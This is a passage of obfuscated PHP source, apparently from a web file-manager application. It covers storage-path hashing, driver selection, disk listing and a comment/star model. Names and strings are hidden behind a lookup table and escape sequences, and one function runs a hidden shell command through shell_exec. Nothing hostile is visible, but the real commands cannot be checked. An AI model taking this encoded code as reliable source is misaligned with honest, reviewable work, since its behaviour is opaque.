. $ÎÚ¡¿š¶[$ÔÛƒœ[88]]); $Ïş¥×™ = $èµÕ¶öÜ . $ÔÛƒœ[1465]; $®ÁÎÕà¶ = $®ÁÎÕà¶ ? $®ÁÎÕà¶ : Cache::get($Ïş¥×™); if (!$®ÁÎÕà¶ && $ñ¸‘Ëœ›) { $®ÁÎÕà¶ = IO::hashSimple($ÎÚ¡¿š¶[$ÔÛƒœ[87]]); Cache::set($Ïş¥×™, $®ÁÎÕà¶ ? $®ÁÎÕà¶ : $èµÕ¶öÜ, 3600 * 24 * 30); } return $®ÁÎÕà¶ ? $®ÁÎÕà¶ : $èµÕ¶öÜ; } public static function hashPathSafe($¯¼ù™±, $Â¶Úª = false) { $ØÒ ¿ =& $_SERVER[¹Éµ„ºå]; $Ñîğé§ = self::hashPath($¯¼ù™±, $Â¶Úª); return md5($Ñîğé§ . $ØÒ ¿[1466] . Model($ØÒ ¿[864])->get($ØÒ ¿[865])); } public static function initSystemPath() { $˜‰‘æ•Ü =& $_SERVER[¹Éµ„ºå]; if (defined($˜‰‘æ•Ü[1467])) { return; } define($˜‰‘æ•Ü[1467], self::systemPath($˜‰‘æ•Ü[189])); define($˜‰‘æ•Ü[1468], self::systemPath($˜‰‘æ•Ü[1469])); define($˜‰‘æ•Ü[1470], self::systemPath($˜‰‘æ•Ü[1471])); define($˜‰‘æ•Ü[1472], self::systemPath($˜‰‘æ•Ü[1473])); IOHistory::bindEvent(); } public static function systemPath($’ıÒ²ˆ­) { $¿£á‹ Å =& $_SERVER[¹Éµ„ºå]; $·÷è§éã = $¿£á‹ Å[1474] . ucfirst($’ıÒ²ˆ­); $§Ş€Éüõ = Model($¿£á‹ Å[864])->get($·÷è§éã); if ($§Ş€Éüõ) { return $§Ş€Éüõ; } if ($’ıÒ²ˆ­ == $¿£á‹ Å[189]) { $§Ş€Éüõ = self::make(Model($¿£á‹ Å[924])->systemRootPathAdd($¿£á‹ Å[628])); } else { $§Ş€Éüõ = self::systemPath($¿£á‹ Å[189]); $Õ®­ú¡Š = self::sourceID($§Ş€Éüõ); $§Ş€Éüõ = self::make(Model($¿£á‹ Å[924])->mkdir($Õ®­ú¡Š, $’ıÒ²ˆ­)); } Model($¿£á‹ Å[864])->set($·÷è§éã, $§Ş€Éüõ); return $§Ş€Éüõ; } public static function systemFolder($éÊ……ØÅ) { $Ï½Â‚ó¯ = IO_PATH_SYSTEM_SOURCE . $éÊ……ØÅ; $ıÂ«´öã = Cache::get($Ï½Â‚ó¯); if (!$ıÂ«´öã) { $‡§±ª³Š = IO::infoFullSimple($Ï½Â‚ó¯); if (!$‡§±ª³Š) { $ıÂ«´öã = IO::mkdir($Ï½Â‚ó¯, REPEAT_SKIP); } else { $ıÂ«´öã = $‡§±ª³Š[$_SERVER[¹Éµ„ºå][87]]; } Cache::set($Ï½Â‚ó¯, $ıÂ«´öã, 3600 * 10); } return $ıÂ«´öã; } public static function defaultDriver() { return Model($_SERVER[¹Éµ„ºå][859])->defaultDriver(); } public static function defaultDriverInit() { $‡öªÆ° =& $_SERVER[¹Éµ„ºå]; static $Í¢íÊò = false; if ($Í¢íÊò) { return $Í¢íÊò; } $ù† ÷Ë‚ = self::defaultDriver(); $Í¢íÊò = IO::init($‡öªÆ°[1475] . $ù† ÷Ë‚[$‡öªÆ°[487]] . $‡öªÆ°[1463]); return $Í¢íÊò; } public static function fileTypeList() { $§‰·Ë¢ş =& $_SERVER[¹Éµ„ºå]; $ÆÉ‡ıû = $GLOBALS[$§‰·Ë¢ş[6]][$§‰·Ë¢ş[1476]]; foreach ($ÆÉ‡ıû as $–¡œ¶É => $Ğì•ƒÊÄ) { $Î÷‘Ÿ«º = $§‰·Ë¢ş[1477] . $–¡œ¶É; $šÖÀ™û« = LNG($Î÷‘Ÿ«º); if ($Î÷‘Ÿ«º != $šÖÀ™û«) { $ÆÉ‡ıû[$–¡œ¶É][$§‰·Ë¢ş[32]] = $šÖÀ™û«; } } return $ÆÉ‡ıû; } public static function ioFileDriverGet($óç•¢© = '') { $Ï¯Òşğ€ =& $_SERVER[¹Éµ„ºå]; static $´ù§úò = array(); static $ø’¹’šï = array(); static $€·™ª¿ = array(); static $ÉçÕ¤„æ = false; if ($ÉçÕ¤„æ === !1) { $ÉçÕ¤„æ = array($Ï¯Òşğ€[598] => array(), $Ï¯Òşğ€[684] => array()); $©şĞç«‡ = Model($Ï¯Òşğ€[1478])->get(!1, $Ï¯Òşğ€[1479]); foreach ($©şĞç«‡ as $‰¨ÔïøŞ => $ûçÃ‡Ì€) { if (!$ûçÃ‡Ì€ || $ûçÃ‡Ì€ == $Ï¯Òşğ€[12]) { continue; } if (strstr($‰¨ÔïøŞ, $Ï¯Òşğ€[1480])) { $š•øê®Ğ = str_replace($Ï¯Òşğ€[1480], $Ï¯Òşğ€[12], $‰¨ÔïøŞ); $ÉçÕ¤„æ[$Ï¯Òşğ€[598]][$š•øê®Ğ] = $ûçÃ‡Ì€; } else { if (strstr($‰¨ÔïøŞ, $Ï¯Òşğ€[1481])) { $š•øê®Ğ = str_replace($Ï¯Òşğ€[1481], $Ï¯Òşğ€[12], $‰¨ÔïøŞ); $ÉçÕ¤„æ[$Ï¯Òşğ€[684]][$š•øê®Ğ] = $ûçÃ‡Ì€; } } } } $å³ £„‰ = self::defaultDriver(); if (!$óç•¢© || !$ÉçÕ¤„æ[$Ï¯Òşğ€[598]] && !$ÉçÕ¤„æ[$Ï¯Òşğ€[684]]) { return $å³ £„‰; } $ƒ•ÎÈŞ = self::getPathSourceID($óç•¢©); if (!$ƒ•ÎÈŞ) { return $å³ £„‰; } if (isset($´ù§úò[$ƒ•ÎÈŞ])) { return $´ù§úò[$ƒ•ÎÈŞ]; } $¹§Ú°¿€ = Model($Ï¯Òşğ€[924])->sourceInfo($ƒ•ÎÈŞ); $áéßÇô = $¹§Ú°¿€[$Ï¯Òşğ€[589]]; $•›ò´• = array(); if (!$¹§Ú°¿€) { return $å³ £„‰; } if ($¹§Ú°¿€[$Ï¯Òşğ€[188]] == $Ï¯Òşğ€[91]) { if (isset($€·™ª¿[$áéßÇô])) { return $€·™ª¿[$áéßÇô]; } if (isset($ÉçÕ¤„æ[$Ï¯Òşğ€[684]][$áéßÇô])) { $®ß«–ı = Model($Ï¯Òşğ€[859])->driverInfo($ÉçÕ¤„æ[$Ï¯Òşğ€[684]][$áéßÇô]); $å³ £„‰ = $®ß«–ı ? $®ß«–ı : $å³ £„‰; $€·™ª¿[$áéßÇô] = $å³ £„‰; $´ù§úò[$ƒ•ÎÈŞ] = $å³ £„‰; return $å³ £„‰; } $•›ò´• = self::groupParentUser($áéßÇô); } else { if ($¹§Ú°¿€[$Ï¯Òşğ€[188]] == $Ï¯Òşğ€[524]) { $¾Â²ÁË§ = Model($Ï¯Òşğ€[1482])->getInfo($áéßÇô); if ($¾Â²ÁË§) { $•›ò´• = explode($Ï¯Òşğ€[50], trim($¾Â²ÁË§[$Ï¯Òşğ€[604]], $Ï¯Òşğ€[50])); $•›ò´• = array_remove_value($•›ò´•, $Ï¯Òşğ€[228]); $•›ò´•[] = $áéßÇô; $•›ò´• = array_reverse($•›ò´•); } } } foreach ($•›ò´• as $Øªü“äÅ) { if (!isset($ÉçÕ¤„æ[$Ï¯Òşğ€[598]][$Øªü“äÅ])) { continue; } if (isset($ø’¹’šï[$Øªü“äÅ])) { return $ø’¹’šï[$Øªü“äÅ]; } $®ß«–ı = Model($Ï¯Òşğ€[859])->driverInfo($ÉçÕ¤„æ[$Ï¯Òşğ€[598]][$Øªü“äÅ]); $å³ £„‰ = $®ß«–ı ? $®ß«–ı : $å³ £„‰; $ø’¹’šï[$Øªü“äÅ] = $å³ £„‰; break; } if ($¹§Ú°¿€[$Ï¯Òşğ€[188]] == $Ï¯Òşğ€[91]) { $€·™ª¿[$áéßÇô] = $å³ £„‰; } $´ù§úò[$ƒ•ÎÈŞ] = $å³ £„‰; return $å³ £„‰; } private static function getPathSourceID($ªÓº¡”¥) { $êºƒ—£Ñ =& $_SERVER[¹Éµ„ºå]; static $¡¿«ş = array(); if (!$ªÓº¡”¥) { return $êºƒ—£Ñ[12]; } $œ—Ğşü = substr($ªÓº¡”¥, 0, strlen($êºƒ—£Ñ[498])) == $êºƒ—£Ñ[498]; $°Û–ŒÜ = substr($ªÓº¡”¥, 0, strlen($êºƒ—£Ñ[1449])) == $êºƒ—£Ñ[1449]; $ò¾ó…¶ = substr($ªÓº¡”¥, 0, strlen($êºƒ—£Ñ[1450])) == $êºƒ—£Ñ[1450]; if (!$œ—Ğşü && !$°Û–ŒÜ && !$ò¾ó…¶) { return $êºƒ—£Ñ[12]; } $³‹®§Ñ‹ = self::parse($ªÓº¡”¥); $Ûğ‡üô³ = $³‹®§Ñ‹[$êºƒ—£Ñ[1346]]; if ($œ—Ğşü) { return $³‹®§Ñ‹[$êºƒ—£Ñ[487]]; } if (isset($¡¿«ş[$Ûğ‡üô³])) { $ú¢ùç = $¡¿«ş[$Ûğ‡üô³]; } else { $ú¢ùç = IO::init($Ûğ‡üô³); $¡¿«ş[$Ûğ‡üô³] = $ú¢ùç; } if (isset($ú¢ùç->pathParse[$êºƒ—£Ñ[1349]])) { return $ú¢ùç->pathParse[$êºƒ—£Ñ[1349]]; } return $êºƒ—£Ñ[12]; } private static function groupParentUser($ñüâˆªé) { $¸ç¿î‘Æ =& $_SERVER[¹Éµ„ºå]; $ÅŠŒİêÎ = Model($¸ç¿î‘Æ[617])->getInfo($ñüâˆªé); if (!$ÅŠŒİêÎ) { return array(); } $Ü—ƒ‰šå = array_to_keyvalue($ÅŠŒİêÎ[$¸ç¿î‘Æ[1483]], $¸ç¿î‘Æ[12], $¸ç¿î‘Æ[1484]); $´×æî¤æ = array(); foreach ($ÅŠŒİêÎ[$¸ç¿î‘Æ[1483]] as $–ƒáĞÅ) { $´×æî¤æ[] = $–ƒáĞÅ[$¸ç¿î‘Æ[1484]]; $ ×ùíË = explode($¸ç¿î‘Æ[50], trim($–ƒáĞÅ[$¸ç¿î‘Æ[604]], $¸ç¿î‘Æ[50])); $ ×ùíË = array_remove_value($ ×ùíË, $¸ç¿î‘Æ[228]); $ ×ùíË = array_reverse($ ×ùíË); $´×æî¤æ = array_merge($´×æî¤æ, $ ×ùíË); } return array_unique($´×æî¤æ); } public static function diskList($åã¨‹úÅ = true) { $¥Ñ–öÚ³ = $_SERVER[¹Éµ„ºå][1485]; if ($åã¨‹úÅ) { $áÚ˜áå¬ = Cache::get($¥Ñ–öÚ³); if (is_array($áÚ˜áå¬)) { return $áÚ˜áå¬; } } $áÚ˜áå¬ = self::diskListGet(); Cache::set($¥Ñ–öÚ³, $áÚ˜áå¬, 60); return $áÚ˜áå¬; } public static function diskListGet() { $¶äâÎ¬“ =& $_SERVER[¹Éµ„ºå]; $ƒİñß¿ = array(); if ($GLOBALS[$¶äâÎ¬“[6]][$¶äâÎ¬“[1486]] == $¶äâÎ¬“[1487]) { $ä›·ãâû = $¶äâÎ¬“[1488]; for ($ûî¢¬Çƒ = 0; $ûî¢¬Çƒ < strlen($ä›·ãâû); $ûî¢¬Çƒ++) { $é—ãÇ§ì = $ä›·ãâû[$ûî¢¬Çƒ] . $¶äâÎ¬“[1489]; if (file_exists($é—ãÇ§ì)) { $ƒİñß¿[] = $é—ãÇ§ì; } } return $ƒİñß¿; } if (!function_exists($¶äâÎ¬“[98])) { $ƒİñß¿[] = $¶äâÎ¬“[983]; return $ƒİñß¿; } $‘Ù› €Ñ = explode($¶äâÎ¬“[285], shell_exec($¶äâÎ¬“[1490])); array_shift($‘Ù› €Ñ); array_pop($‘Ù› €Ñ); $ìöÍ¼³ = array($¶äâÎ¬“[1491], $¶äâÎ¬“[1492], $¶äâÎ¬“[1493], $¶äâÎ¬“[1494], $¶äâÎ¬“[1495], $¶äâÎ¬“[1496], $¶äâÎ¬“[1497], $¶äâÎ¬“[1498]); foreach ($‘Ù› €Ñ as $ø¼™ğÕÑ) { $ş§‘ìú¿ = preg_split($¶äâÎ¬“[1499], $ø¼™ğÕÑ); $é—ãÇ§ì = $ş§‘ìú¿[count($ş§‘ìú¿) - 1]; if (!strstr($ş§‘ìú¿[0], $¶äâÎ¬“[1500]) || !$é—ãÇ§ì) { continue; } $ğÅ‹·Ö¹ = rtrim($é—ãÇ§ì, $¶äâÎ¬“[8]) . $¶äâÎ¬“[8]; $ƒİñß¿[] = $ğÅ‹·Ö¹; } return $ƒİñß¿; } public static function isSameDisk($ËËéÌ§÷, $ü¸Ğé¾Ù) { $¢Ø£Ò‘Ã =& $_SERVER[¹Éµ„ºå]; if ($GLOBALS[$¢Ø£Ò‘Ã[6]][$¢Ø£Ò‘Ã[1486]] == $¢Ø£Ò‘Ã[1487]) { return strtolower(substr($ËËéÌ§÷, 0, 1)) == strtolower(substr($ü¸Ğé¾Ù, 0, 1)); } $è™ÇıèÜ = stat($ËËéÌ§÷); $²Ò“ıî = stat($ü¸Ğé¾Ù); if ($è™ÇıèÜ === !1 || $²Ò“ıî === !1) { return !1; } return $è™ÇıèÜ[$¢Ø£Ò‘Ã[1501]] === $²Ò“ıî[$¢Ø£Ò‘Ã[1501]]; $¿É¥²œò = self::diskList(); $ÑÚ×ò¼Õ = !1; $Šóˆ¹Íú = !1; sort($¿É¥²œò); $¿É¥²œò = array_reverse($¿É¥²œò); $ËËéÌ§÷ = rtrim($ËËéÌ§÷, $¢Ø£Ò‘Ã[8]) . $¢Ø£Ò‘Ã[8]; $ü¸Ğé¾Ù = rtrim($ü¸Ğé¾Ù, $¢Ø£Ò‘Ã[8]) . $¢Ø£Ò‘Ã[8]; foreach ($¿É¥²œò as $ñøû¯ò) { $ñİï¬ÒÓ = strlen($ñøû¯ò); if (!$ÑÚ×ò¼Õ && substr($ËËéÌ§÷, 0, $ñİï¬ÒÓ) == $ñøû¯ò) { $ÑÚ×ò¼Õ = $ñøû¯ò; } if (!$Šóˆ¹Íú && substr($ü¸Ğé¾Ù, 0, $ñİï¬ÒÓ) == $ñøû¯ò) { $Šóˆ¹Íú = $ñøû¯ò; } if ($ÑÚ×ò¼Õ && $Šóˆ¹Íú) { break; } } return $ÑÚ×ò¼Õ === $Šóˆ¹Íú; } public static function transferType($–Íœ¹§ª, $Íîİùˆè) { $Å¯Ø¯À =& $_SERVER[¹Éµ„ºå]; $Ë¿µá¾ğ = self::driverType($–Íœ¹§ª); $ş•»§ò± = self::driverType($Íîİùˆè); if ($Ë¿µá¾ğ[$Å¯Ø¯À[33]] == $ş•»§ò±[$Å¯Ø¯À[33]] && $Ë¿µá¾ğ[$Å¯Ø¯À[1502]] == $ş•»§ò±[$Å¯Ø¯À[1502]]) { return $Å¯Ø¯À[1503]; } if ($Ë¿µá¾ğ[$Å¯Ø¯À[33]] == $Å¯Ø¯À[1017] && $ş•»§ò±[$Å¯Ø¯À[33]] == $Å¯Ø¯À[106]) { return $Å¯Ø¯À[1374]; } if ($Ë¿µá¾ğ[$Å¯Ø¯À[33]] == $Å¯Ø¯À[106] && $ş•»§ò±[$Å¯Ø¯À[33]] == $Å¯Ø¯À[1017]) { return $Å¯Ø¯À[107]; } return $Å¯Ø¯À[1504]; } public static function driverType($ôÆëı½Ê) { $§áö°º =& $_SERVER[¹Éµ„ºå]; $·¹¢î‹‚ = str_replace($§áö°º[1505], $§áö°º[12], strtolower($ôÆëı½Ê->getType())); if ($·¹¢î‹‚ == $§áö°º[849] || $·¹¢î‹‚ == $§áö°º[1506] || $·¹¢î‹‚ == $§áö°º[1507]) { $¾æáõã½ = self::ioFileDriverGet($§áö°º[498] . $ôÆëı½Ê->pathParse[$§áö°º[1349]] . $§áö°º[402]); $ôÆëı½Ê = IO::init($§áö°º[1475] . $¾æáõã½[$§áö°º[487]] . $§áö°º[1463]); } else { if ($·¹¢î‹‚ == $§áö°º[1383] || $·¹¢î‹‚ == $§áö°º[1508]) { $ôÆëı½Ê = IO::init($ôÆëı½Ê->pathParse[$§áö°º[1326]]); } } $”Ë÷ˆŞº = $ôÆëı½Ê->path; $·¹¢î‹‚ = str_replace($§áö°º[1505], $§áö°º[12], strtolower($ôÆëı½Ê->getType())); if ($·¹¢î‹‚ == $§áö°º[106]) { return array($§áö°º[33] => $§áö°º[106], $§áö°º[1502] => $§áö°º[12], $§áö°º[87] => $”Ë÷ˆŞº, $§áö°º[96] => $ôÆëı½Ê); } return array($§áö°º[33] => $§áö°º[1017], $§áö°º[1502] => $ôÆëı½Ê->pathDriver, $§áö°º[87] => $”Ë÷ˆŞº, $§áö°º[96] => $ôÆëı½Ê); } public static function pathDriverType($¢¹£ïÍ) { return $¢¹£ïÍ ? self::driverType(IO::init($¢¹£ïÍ)) : !1; } public static function pathDriverLocal($’†ùÈ) { $£›é¿³´ =& $_SERVER[¹Éµ„ºå]; $—ÅÄˆ± = $’†ùÈ ? self::driverType(IO::init($’†ùÈ)) : !1; return strtolower($—ÅÄˆ±[$£›é¿³´[33]]) == $£›é¿³´[106] ? !0 : !1; } public static function allowCover($»åº€ˆØ, $ïÒı¯²è = true) { $ÛÜ‰‰‹½ =& $_SERVER[¹Éµ„ºå]; if (is_string($»åº€ˆØ)) { $»åº€ˆØ = IO::info($»åº€ˆØ); } if (!$»åº€ˆØ || $»åº€ˆØ[$ÛÜ‰‰‹½[33]] == $ÛÜ‰‰‹½[78] || $»åº€ˆØ[$ÛÜ‰‰‹½[79]] <= 100) { return !1; } if (isset($»åº€ˆØ[$ÛÜ‰‰‹½[1509]]) || !$»åº€ˆØ[$ÛÜ‰‰‹½[87]]) { return !1; } if (isset($»åº€ˆØ[$ÛÜ‰‰‹½[232]]) && !$»åº€ˆØ[$ÛÜ‰‰‹½[232]]) { return !1; } static $€Âóš«Ë = false; if (!$€Âóš«Ë || !$ïÒı¯²è) { $©š‰¡³ = self::driverType(IO::init($»åº€ˆØ[$ÛÜ‰‰‹½[87]])); $¨ôÉ¯ÙÀ = $©š‰¡³[$ÛÜ‰‰‹½[96]]; $€Âóš«Ë = $ÛÜ‰‰‹½[194]; if ($©š‰¡³[$ÛÜ‰‰‹½[33]] == $ÛÜ‰‰‹½[106]) { $€Âóš«Ë = $ÛÜ‰‰‹½[1510]; } if ($©š‰¡³[$ÛÜ‰‰‹½[96]] && is_array($©š‰¡³[$ÛÜ‰‰‹½[96]]->config)) { $É˜ËáÓ¤ = $©š‰¡³[$ÛÜ‰‰‹½[96]]->config; if (isset($É˜ËáÓ¤[$ÛÜ‰‰‹½[1511]]) && $É˜ËáÓ¤[$ÛÜ‰‰‹½[1511]]) { $€Âóš«Ë = $ÛÜ‰‰‹½[1510]; } } $’³­¡˜ñ = KodIO::defaultDriver(); if (strtolower($’³­¡˜ñ[$ÛÜ‰‰‹½[96]]) == $ÛÜ‰‰‹½[106] && is_array($’³­¡˜ñ[$ÛÜ‰‰‹½[6]])) { $’¬æá‚£ = $’³­¡˜ñ[$ÛÜ‰‰‹½[6]][$ÛÜ‰‰‹½[1358]]; if (substr($’¬æá‚£, 0, 2) == $ÛÜ‰‰‹½[1512]) { $’¬æá‚£ = str_replace($ÛÜ‰‰‹½[1512], BASIC_PATH, $’¬æá‚£); } $’¬æá‚£ = str_replace($ÛÜ‰‰‹½[254], $ÛÜ‰‰‹½[8], $’¬æá‚£); if (substr($»åº€ˆØ[$ÛÜ‰‰‹½[87]], 0, strlen($’¬æá‚£)) == $’¬æá‚£) { $€Âóš«Ë = $ÛÜ‰‰‹½[194]; } } } return $€Âóš«Ë == $ÛÜ‰‰‹½[1510] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($¶Ï±›¯ƒ) { parent::__construct($¶Ï±›¯ƒ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto eËïíÅ¾–ñ; C‘“•À‡·: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\145\x6e\x74"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\141\155\x65" => "\143\157\x6d\155\x65\156\x74\137\x6d\145\164\x61", "\155\145\x74\x61\x46\x69\x65\154\144" => "\x63\157\x6d\x6d\145\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ ·¡Öáê) { $µÒâÜ­ =& $_SERVER[¹Éµ„ºå]; if ($ ·¡Öáê[$µÒâÜ­[2201]]) { $¬‹ñ¦– = $this->where(array($µÒâÜ­[2202] => $ ·¡Öáê[$µÒâÜ­[2201]]))->find(); if (!$¬‹ñ¦– || $¬‹ñ¦–[$µÒâÜ­[188]] != $ ·¡Öáê[$µÒâÜ­[188]] || $¬‹ñ¦–[$µÒâÜ­[589]] != $ ·¡Öáê[$µÒâÜ­[589]]) { return !1; } $this->where(array($µÒâÜ­[2202] => $ ·¡Öáê[$µÒâÜ­[2201]]))->setAdd($µÒâÜ­[2203], 1); } $ ·¡Öáê[$µÒâÜ­[2204]] = 0; $ ·¡Öáê[$µÒâÜ­[2203]] = 0; $ ·¡Öáê[$µÒâÜ­[841]] = 1; return $this->add($ ·¡Öáê); } public function commentCount($˜€÷ÇÌä, $¯İåÓÅ–, $ªæ­úÍ = false) { $Š–Ó­éİ =& $_SERVER[¹Éµ„ºå]; if (!$˜€÷ÇÌä) { return array(); } if (is_string($˜€÷ÇÌä) || is_int($˜€÷ÇÌä)) { $˜€÷ÇÌä = array($˜€÷ÇÌä); } $•¦¯İÛç = array($Š–Ó­éİ[589], $Š–Ó­éİ[2205] => $Š–Ó­éİ[585]); $Ù‚‹‰è÷ = array($Š–Ó­éİ[589] => array($Š–Ó­éİ[7], $˜€÷ÇÌä), $Š–Ó­éİ[188] => $¯İåÓÅ–); if ($ªæ­úÍ) { $Ù‚‹‰è÷[$Š–Ó­éİ[1582]] = $ªæ­úÍ; } $Ç•¦úè = $this->field($•¦¯İÛç)->where($Ù‚‹‰è÷)->group($Š–Ó­éİ[589])->select(); return array_to_keyvalue($Ç•¦úè, $Š–Ó­éİ[589], $Š–Ó­éİ[585]); } public function starTarget($’—àâŒ, $‡ãçó¥¤) { $â‚´¬• =& $_SERVER[¹Éµ„ºå]; $Çê¬Óå = $’—àâŒ + self::TYPE_STAR_OFFSET; $­‰æùÌÇ = array($â‚´¬•[1582] => USER_ID, $â‚´¬•[188] => $Çê¬Óå, $â‚´¬•[589] => $‡ãçó¥¤); $™÷…í = $this->where($­‰æùÌÇ)->find(); if ($™÷…í) { return $this->where(array($â‚´¬•[487] => $™÷…í[$â‚´¬•[487]]))->delete(); } $Íó«Òæ« = array($â‚´¬•[2201] => 0, $â‚´¬•[1582] => USER_ID, $â‚´¬•[841] => 1, $â‚´¬•[168] => $â‚´¬•[12], $â‚´¬•[188] => $Çê¬Óå, $â‚´¬•[589] => $‡ãçó¥¤, $â‚´¬•[2204] => 0, $â‚´¬•[2203] => 0); return $this->add($Íó«Òæ«); } public function starTargetCount($…ÍÜóåû, $€½ï¦ï…) { $ã¬æá– =& $_SERVER[¹Éµ„ºå]; $ÌĞôªëª = $€½ï¦ï… + self::TYPE_STAR_OFFSET; $˜ÆÔöÇ… = $this->commentCount($…ÍÜóåû, $ÌĞôªëª); $ÑÎŒÊŒô = $this->commentCount($…ÍÜóåû, $ÌĞôªëª, USER_ID); return array($ã¬æá–[2206] => $˜ÆÔöÇ…, $ã¬æá–[2207] => $ÑÎŒÊŒô); } public function starTargetUserList($¿³…ı®, $âüå ) { $‹¾°ÄÙ =& $_SERVER[¹Éµ„ºå]; $’­ñ¹²¨ = $¿³…ı® + self::TYPE_STAR_OFFSET; $Ã…Ÿ­êî = array($‹¾°ÄÙ[589] => $âüå , $‹¾°ÄÙ[188] => $’­ñ¹²¨); $¾ÉËÒÁÂ = $this->where($Ã…Ÿ­êî)->count(); $ıèÁŠÔ¦ = array($‹¾°ÄÙ[332] => $¾ÉËÒÁÂ, $‹¾°ÄÙ[2208] => array()); if (!$¾ÉËÒÁÂ) { return $ıèÁŠÔ¦; } $‚†Î©ìØ = $this->field($‹¾°ÄÙ[1582])->where($Ã…Ÿ­êî)->limit(500)->select(); $‚†Î©ìØ = array_to_keyvalue($‚†Î©ìØ, $‹¾°ÄÙ[12], $‹¾°ÄÙ[1582]); $ıèÁŠÔ¦[$‹¾°ÄÙ[2208]] = Model($‹¾°ÄÙ[597])->userListInfo($‚†Î©ìØ); return $ıèÁŠÔ¦; } public function prasiseUserList($¨ÜŸğò) { $ñ’¿İ½î =& $_SERVER[¹Éµ„ºå]; $ó»—…†• = array($ñ’¿İ½î[2209] => $¨ÜŸğò); $êúÔ¨È = $this->where($ó»—…†•)->find(); $ßö‰ùÜÈ = _get($êúÔ¨È, $ñ’¿İ½î[2204], 0); $‹§‚´ß  = array($ñ’¿İ½î[332] => $ßö‰ùÜÈ, $ñ’¿İ½î[2208] => array()); if (!$ßö‰ùÜÈ) { return $‹§‚´ß ; } $€”–ÃÀ¾ = Model($ñ’¿İ½î[2210])->field($ñ’¿İ½î[1582])->where($ó»—…†•)->limit(500)->select(); $€”–ÃÀ¾ = array_to_keyvalue($€”–ÃÀ¾, $ñ’¿İ½î[12], $ñ’¿İ½î[1582]); $‹§‚´ß [$ñ’¿İ½î[2208]] = Model($ñ’¿İ½î[597])->userListInfo($€”–ÃÀ¾); return $‹§‚´ß ; } public function remove($çÒå÷Ü¥) { $”’È¬•« =& $_SERVER[¹Éµ„ºå]; $ú³ºŠãÔ = array($”’È¬•«[2202] => $çÒå÷Ü¥); $ØÑºñÖ = $this->where($ú³ºŠãÔ)->find(); if ($ØÑºñÖ[$”’È¬•«[2201]]) { $this->where(array($”’È¬•«[2202] => $ØÑºñÖ[$”’È¬•«[2201]]))->setAdd($”’È¬•«[2203], -1); } return $this->removeArray($çÒå÷Ü¥); } public function edit($¼‘º‹‡ô, $ñÅØŒÏ‹) { $ÁÓÎş³ò =& $_SERVER[¹Éµ„ºå]; $×€¨¹¾û = array($ÁÓÎş³ò[2202] => $¼‘º‹‡ô); return $this->where($×€¨¹¾û)->save(array($ÁÓÎş³ò[2211] => $ñÅØŒÏ‹)); } public function prasise($¢È ´™ö) { $óàïÅÄº =& $_SERVER[¹Éµ„ºå]; $ªşÚ“×˜ = Model($óàïÅÄº[2212]); $˜¡«Óô = array($óàïÅÄº[2202] => $¢È ´™ö, $óàïÅÄº[1956] => USER_ID); $è†÷ÏáÈ = $ªşÚ“×˜->where($˜¡«Óô)->find(); if (!$è†÷ÏáÈ) { $ªşÚ“×˜->add($˜¡«Óô); $ÊË¥ÂÂ = $this->where(array($óàïÅÄº[2202] => $¢È ´™ö))->setAdd($óàïÅÄº[2204], 1); } else { $ªşÚ“×˜->where($˜¡«Óô)->delete(); $ÊË¥ÂÂ = $this->where(array($óàïÅÄº[2202] => $¢È ´™ö))->setAdd($óàïÅÄº[2204], -1); } return $ÊË¥ÂÂ; } public function targetInfo($œıûˆ–Ç, $“­ãâ Å) { $ˆ–’Üì× =& $_SERVER[¹Éµ„ºå]; $¬Ù‡ÉÀÅ = array($ˆ–’Üì×[670] => $œıûˆ–Ç, $ˆ–’Üì×[671] => $“­ãâ Å); $‹¤çÎ¾ = $this->where($¬Ù‡ÉÀÅ)->count(); $œ€êÏ°Ô = "\122\x49\x47\x48\x54\x20\112\117\x49\116\x20{$this->tablePrefix}\x63\157\155\155\x65\x6e\164\137\160\x72\x61\151\x73\x65\40\163\x74\141\162\x20\157\x6e\x20\143\157\155\155\145\156\x74\56\x63\157\155\155\x65\156\164\111\x44\x20\75\x20\163\x74\141\162\x2e\143\157\155\155\145\x6e\164\x49\x44"; $…†ôÅºú = $this->alias($ˆ–’Üì×[429])->where($¬Ù‡ÉÀÅ)->join($œ€êÏ°Ô, $ˆ–’Üì×[2213])->count(); $äª‚’Ì¤ = array($ˆ–’Üì×[2214] => $‹¤çÎ¾, $ˆ–’Üì×[2215] => $…†ôÅºú); return $äª‚’Ì¤; } public function listData($œËûÂƒî) { $›¾…ÙèÃ =& $_SERVER[¹Éµ„ºå]; if (isset($œËûÂƒî[$›¾…ÙèÃ[2216]])) { if ($œËûÂƒî[$›¾…ÙèÃ[2216]]) { $œËûÂƒî[$›¾…ÙèÃ[2209]] = array($›¾…ÙèÃ[1171], intval($œËûÂƒî[$›¾…ÙèÃ[2216]])); } unset($œËûÂƒî[$›¾…ÙèÃ[2216]]); } if (isset($œËûÂƒî[$›¾…ÙèÃ[2217]])) { if ($œËûÂƒî[$›¾…ÙèÃ[2217]]) { $œËûÂƒî[$›¾…ÙèÃ[2209]] = array($›¾…ÙèÃ[1168], intval($œËûÂƒî[$›¾…ÙèÃ[2217]])); } unset($œËûÂƒî[$›¾…ÙèÃ[2217]]); } return $this->_listData($œËûÂƒî); } private function _listData($¼ñåÙíİ) { $•¦×œˆ× =& $_SERVER[¹Éµ„ºå]; $”Œàƒ®¸ = $this->where($¼ñåÙíİ)->_makeOrder()->selectPage(100); $this->_listAppendParent($”Œàƒ®¸[$•¦×œˆ×[446]]); $this->_listAppendUser($”Œàƒ®¸[$•¦×œˆ×[446]]); $this->_listAppendMeta($”Œàƒ®¸[$•¦×œˆ×[446]]); return $”Œàƒ®¸; } private function _makeOrder() { $ßÜÉÆ =& $_SERVER[¹Éµ„ºå]; $®ôÈ„ê» = array($ßÜÉÆ[2204], $ßÜÉÆ[2203], $ßÜÉÆ[231]); $§Ö³ ¿î = Input::get($ßÜÉÆ[544], $ßÜÉÆ[7], $ßÜÉÆ[512], $®ôÈ„ê»); $ÖãÄâ¾¥ = Input::get($ßÜÉÆ[545], 